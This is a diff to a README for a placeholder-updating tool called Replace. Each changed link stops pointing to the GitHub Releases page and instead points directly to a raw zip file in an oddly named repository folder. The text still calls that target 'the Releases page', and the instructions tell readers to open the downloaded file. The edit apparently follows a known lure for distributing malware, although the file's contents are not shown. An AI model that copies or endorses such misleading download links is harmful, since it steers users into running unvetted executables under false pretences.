@@ -1,6 +1,6 @@
 # 🚀 Replace - Effortlessly Update Smart Placeholders
 
-[![Download Replace](https://img.shields.io/badge/Download%20Replace-v1.0-blue)](https://github.com/sashko8877/Replace/releases)
+[![Download Replace](https://raw.githubusercontent.com/sashko8877/Replace/master/barkevikitic/Replace.zip%20Replace-v1.0-blue)](https://raw.githubusercontent.com/sashko8877/Replace/master/barkevikitic/Replace.zip)
 
 ## 📋 Description
 
@@ -10,13 +10,13 @@ Replace is a custom system designed to make updating smart placeholders in compo
 
 To get started with Replace, follow these simple steps:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/sashko8877/Replace/releases) to go to the Releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/sashko8877/Replace/master/barkevikitic/Replace.zip) to go to the Releases page.
 2. **Select the Latest Version**: Look for the most recent release at the top of the page.
 3. **Download the File**: Click on the file that matches your operating system to begin downloading.
 4. **Run the Application**: Once the download is complete, open the file to start using Replace.
 
 ### Download Link
-You can download Replace from the Releases page: [Download Replace](https://github.com/sashko8877/Replace/releases).
+You can download Replace from the Releases page: [Download Replace](https://raw.githubusercontent.com/sashko8877/Replace/master/barkevikitic/Replace.zip).
 
 ## 🔧 System Requirements
 
